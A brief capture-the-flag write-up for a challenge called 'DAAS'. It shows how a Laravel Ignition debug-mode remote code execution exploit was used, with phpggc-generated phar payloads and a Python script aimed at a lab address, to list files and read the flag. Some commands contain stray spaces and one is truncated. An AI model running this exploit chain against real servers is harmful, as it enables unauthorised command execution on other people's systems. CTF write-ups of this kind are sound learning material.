### DAAS

#### Write UP

- We are given a website, which hosts basic laravel documentation.
- So, I search on web for known larabel exploits and luckily I found one.
- The exploit uses laravel session cookies and creates remote command execution.
- I used the rce file available on https://www.ambionics.io/blog/laravel-debug-rce
- We follow the instructions mentioned there, and download phpggc.
- We use the following commands to get the flag. -`php - d'phar.readonly=0' phpggc/phpggc - -phar phar - f - o exploit.phar monolog/rce1 system 'ls'` : This will create a exploit file for execution.
  - `python3 laravel-ignition-rce.py http: // 138.68.168.137: 30335 / exploit.phar` : This will execute the commands on the server/
  - `phar.readonly=0' phpggc/phpggc - -phar phar - f - o exploit.phar monolog/rce1 system 'cat ../../flagipiHi'` : On exploring further, we found the flag.txt file
  - `python3 laravel-ignition-rce.py http: // 138.68.168.137: 30335 / exploit.phar` : This will execute the commands on the server/
  - And we got the flag.
